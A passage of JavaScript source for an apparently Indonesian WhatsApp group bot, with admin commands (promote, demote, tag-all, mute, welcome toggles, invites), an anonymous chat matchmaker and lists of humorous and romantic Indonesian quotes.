if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
    await NanoBotz.removeProfilePicture(from)
    }
    break

case 'promote': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await NanoBotz.groupParticipantsUpdate(m.chat, [users], 'promote')
await replynano(`Done`)
}
break

case 'demote': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await NanoBotz.groupParticipantsUpdate(m.chat, [users], 'demote')
await replynano(`Done`)
}
break

case 'hidetag': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
NanoBotz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break

case 'ht': {
if (!m.isGroup) return reply(mess.only.group)
if (!DanzTheCreator) return reply(mess.only.owner)
NanoBotz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break

case 'totag': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
               if (!m.quoted) return replynano(`Reply message with caption ${prefix + command}`)
               NanoBotz.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break

case 'tagall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
me = m.sender
let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝ 
 
 😶 *Tagger :*  @${me.split('@')[0]}
 🌿 *Message : ${q ? q : 'no message'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
}
NanoBotz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'mute':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !DanzTheCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#mute', m.sender, _cmd)
if (isMute) return reply(`_Mute sudah aktif kak_`)
mute.push(m.chat)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Mute In This Group')
}
else if (args[0] === "off") {
addCountCmd('#mute', m.sender, _cmd)
if (!isMute) return reply(`_UnMute sudah aktif kak_`)
let anu = mute.indexOf(m.chat)
mute.splice(anu, 1)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Unmute In This Group')
}else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
//=========================================\\======
case 'autoaigrup':case 'aigrup': case 'autoaigc':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !DanzTheCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (isAutoAiGc) return reply(`Udah aktif`)
openaigc.push(m.chat)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
reply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (!isAutoAiGc) return reply(`Udah nonaktif`)
let anu = openaigc.indexOf(m.chat)
openaigc.splice(anu, 1)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
reply('Successfully Disabling Auto AI')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'autosimi':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !DanzTheCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#autosimi', m.sender, _cmd)
if (isAutosimi) return reply(`Udah aktif`)
siminya.push(m.chat)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(siminya, null, 2))
reply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autosimi', m.sender, _cmd)
if (!isAutosimi) return reply(`Udah nonaktif`)
let anu = siminya.indexOf(m.chat)
siminya.splice(anu, 1)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(siminya, null, 2))
reply('Successfully Disabling Auto Simi')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
break
//=========================================\\=====
case 'onlygroup':
            case 'onlygc':
                if (!DanzTheCreator) return reply(mess.only.owner)
                if (args.length < 1) return replynano(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.settings[botNumber].onlygrub = true
                    replynano(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlygrub = false
                    replynano(`Successfully Changed Onlygroup To ${q}`)
                }
            break
//=========================================\\======
case 'welcome':
if (!m.isGroup) return reply('Fitur Khusus Group!!!')
if (!isAdmins && !DanzTheCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#welcome', m.sender, _cmd)
if (isWelcome) return reply(`Udah on`)
_welcome.push(m.chat)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
reply('Sukses mengaktifkan welcome di grup ini')
} else if (args[0] === "off") {
addCountCmd('#welcome', m.sender, _cmd)
if (!isWelcome) return reply(`Udah off`)
let anu = _welcome.indexOf(m.chat)
_welcome.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
reply('Sukses menonaktifkan welcome di grup ini')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
break
case 'left': case 'goodbye':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !DanzTheCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#left', m.sender, _cmd)
if (isLeft) return reply(`Udah on`)
_left.push(m.chat)
fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2))
reply('Sukses mengaktifkan goodbye di grup ini')
} else if (args[0] === "off") {
addCountCmd('#left', m.sender, _cmd)
if (!isLeft) return reply(`Udah off`)
let anu = _left.indexOf(m.chat)
_left.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
reply('Sukses menonaktifkan goodbye di grup ini')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
break
case 'invite': {
	if (!m.isGroup) return reply(mess.only.group)
	if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!text) return replynano(`Silakan Masukkan Nomer yang Ingin Anda Invite\n\nContoh :\n*${prefix + command}* 6282268881337`)
if (text.includes('+')) return replynano(`Enter the number together without *+*`)
if (isNaN(text)) return replynano(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await NanoBotz.groupInviteCode(group)
      await NanoBotz.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replynano(` An invite link is sent to the user`) 
}
break
case 'setppgcpanjang': {
  const jimp_1 = require('jimp')
  async function pepe(media) {
    const jimp = await jimp_1.read(media)
    const min = jimp.getWidth()
    const max = jimp.getHeight()
    const cropped = jimp.crop(0, 0, min, max)
    return {
      img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
      preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
    }
  }
  
    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || q.mediaType || ''
    if (/image/g.test(mime) && !/webp/g.test(mime)) {
      try {
        const media = await NanoBotz.downloadAndSaveMediaMessage(quoted)
        let { img } = await pepe(media)
        await NanoBotz.query({
          tag: 'iq',
          attrs: {
            to: m.chat,
            type:'set',
            xmlns: 'w:profile:picture'
          },
          content: [
            {
              tag: 'picture',
              attrs: { type: 'image' },
              content: img
            }
          ]
        })
        reply(`Admin @${(m.sender || '').replace(/@s\.whatsapp\.net/g, '')} telah mengganti Icon Group!`, null, { mentions: [m.sender] })
      } catch (e) {
        console.log(e)
        reply(`Terjadi kesalahan, coba lagi nanti.`)
      }
    } else {
      reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
    }
  }
  break

  
// Menangani perintah 'afk'
// Menangani perintah 'afk'
case 'afk': {
				let user = db.users[m.sender]
				user.afkTime = + new Date
				user.afkReason = text
				m.reply( `🚀 ${m.sender.split('@')[0]} Telah AFK\n alasan ${text ? ': ' + text : ''}`)
			}
			break
   

//=========================================\\======










































break
//=========================================\\======
//case anonymous
case 'anonymouschat': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
reply(`Hi ${pushname} Welcome To Anonymous Chat\n\n${prefix}start -- _mencari partner_`)
 }
break
//=========================================\\======
case 'mulai': case 'start': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
reply(`Kamu Masih Berada Di dalam Sesi Anonymous\n\n${prefix}keluar -- _keluar dari sesi chat_`)
return false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
NanoBotz.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
case 'next': case 'lanjut': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
reply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
return false
}
let other = romeo.other(m.sender)
if (other) await NanoBotz.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
NanoBotz.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
//=========================================\\======






































//=========================================\\======
//case quotes
case 'quotesbacot': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
  reply(bacotan)
}
break
//=========================================\\======
case 'quotesbucin': {
const bucin = [
    "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
    "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
    "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
    "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
    "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
    "Pacar orang adalah jodoh kita yang tertunda.",
    "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
    "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
    "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
    "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
    "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
    "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
    "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
    "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
    "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
    "Aku ingin menjadi satu-satunya, bukan salah satunya.",
    "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
    "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
    "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
    "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
    "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
    "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
    "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
    "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
    "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
    "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
    "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
    "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
    "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
    "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
    "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
    "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
    "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
    "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
    "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
    "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
    "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
    "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
    "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
    "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
    "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
    "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
    "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
    "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
    "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
    "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
    "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
    "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
    "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
    "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
    "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
    "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
    "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
    "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
    "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
    "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
    "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
    "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
    "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
    "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
    "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
    "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
    "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
    "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
    "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
    "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
    "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
    "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
    "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
    "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
    "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
    "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
    "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
    "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
    "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
    "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
    "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
    "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
    "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
    "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
    "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
    "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
    "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
    "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
    "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
    "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
    "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
    "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
    "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
    "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
    "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
    "Saben dino kegowo ngimpi tapi ora biso nduweni.",
    "Ora ketemu koe 30 dino rasane koyo sewulan.",
    "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
    "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
    "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
    "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
    "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
    "Kanyaah akang moal luntur najan make Bayclean.",
    "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
    "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
    "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
    "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
    "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
    "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
    "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
    "Cukup jaringan aja yang hilang, kamu jangan.",
    "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
    "Musuhku adalah mereka yang ingin memilikimu juga.",
    "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
    "Jam tidurku hancur dirusak rindu.",
    "Cukup China aja yang jauh, cinta kita jangan.",
    "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
    "Cuma satu keinginanku, dicintai olehmu..",
    "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
    "Cukup antartika aja yang jauh. Antarkita jangan."
]
const Nanotruth = bucin[Math.floor(Math.random() * bucin.length)]
	reply(`${Nanotruth}`)
}
break

//=========================================\\======
case 'quotesmotivasi': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
